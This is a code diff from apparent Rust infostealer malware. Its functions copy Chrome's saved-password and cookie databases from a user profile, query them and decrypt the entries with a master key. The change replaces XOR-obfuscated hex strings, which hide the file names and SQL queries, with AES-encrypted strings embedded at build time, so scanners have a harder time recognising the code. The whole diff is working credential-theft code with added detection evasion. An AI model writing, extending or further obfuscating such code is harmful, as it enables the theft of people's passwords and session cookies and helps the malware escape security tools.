@@ -5,17 +5,18 @@ use rusqlite::{Connection, OpenFlags};
 use serde_json::{json, Value};
 
 use crate::crypto;
-use crate::xor::decode as obf_decode;
+use crate::xor::{aes_str, aes_dec};
 
-const LOGIN_DATA: &str = "16353d33347a1e3b2e3b";
-const SQL_PASSWORDS: &str = "091f161f190e7a3528333d3334052f2836767a2f293f28343b373f052c3b362f3f767a2a3b29292d35283e052c3b362f3f7a1c0815177a36353d333429";
-const SQL_COOKIES: &str = "091f161f190e7a3235292e05313f23767a343b373f767a3f343928232a2e3f3e052c3b362f3f767a2a3b2e327a1c0815177a39353531333f297a161317130e7a6f6a6a";
-const NETWORK: &str = "143f2e2d352831";
-const COOKIES: &str = "19353531333f29";
+mod dtb_aes {
+    include!(concat!(env!("OUT_DIR"), "/dtb_aes_strings.rs"));
+}
+
+use dtb_aes::*;
 
 pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
     let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
-    let login_data = profile_dir.join(obf_decode(LOGIN_DATA));
+    let login_data_name = aes_str(LOGIN_DATA_CT, &LOGIN_DATA_KEY, &LOGIN_DATA_NONCE);
+    let login_data = profile_dir.join(&login_data_name);
 
     let tmp = copy_db_to_temp(&login_data, "chrome_login_data_tmp.db")?;
     let conn = Connection::open_with_flags(
@@ -24,8 +25,9 @@ pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Va
     )
     .map_err(|e| format!("open Login Data: {e}"))?;
 
+    let sql_pw = aes_str(SQL_PASSWORDS_CT, &SQL_PASSWORDS_KEY, &SQL_PASSWORDS_NONCE);
     let mut stmt = conn
-        .prepare(obf_decode(SQL_PASSWORDS))
+        .prepare(&sql_pw)
         .map_err(|e| format!("prepare: {e}"))?;
 
     let rows: Vec<Value> = stmt
@@ -61,12 +63,14 @@ pub fn extract_passwords(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Va
 
 pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Value>, String> {
     let master_key: &[u8; 32] = master_key.try_into().map_err(|_| "key not 32 bytes".to_string())?;
+    let network_name  = aes_str(NETWORK_CT, &NETWORK_KEY, &NETWORK_NONCE);
+    let cookies_name  = aes_str(COOKIES_CT, &COOKIES_KEY, &COOKIES_NONCE);
     let cookies_path = {
-        let net = profile_dir.join(obf_decode(NETWORK)).join(obf_decode(COOKIES));
+        let net = profile_dir.join(&network_name).join(&cookies_name);
         if net.exists() {
             net
         } else {
-            profile_dir.join(obf_decode(COOKIES))
+            profile_dir.join(&cookies_name)
         }
     };
 
@@ -77,8 +81,9 @@ pub fn extract_cookies(profile_dir: &Path, master_key: &[u8]) -> Result<Vec<Valu
     )
     .map_err(|e| format!("open Cookies: {e}"))?;
 
+    let sql_ck = aes_str(SQL_COOKIES_CT, &SQL_COOKIES_KEY, &SQL_COOKIES_NONCE);
     let mut stmt = conn
-        .prepare(obf_decode(SQL_COOKIES))
+        .prepare(&sql_ck)
         .map_err(|e| format!("prepare cookies: {e}"))?;
 
     let rows: Vec<Value> = stmt
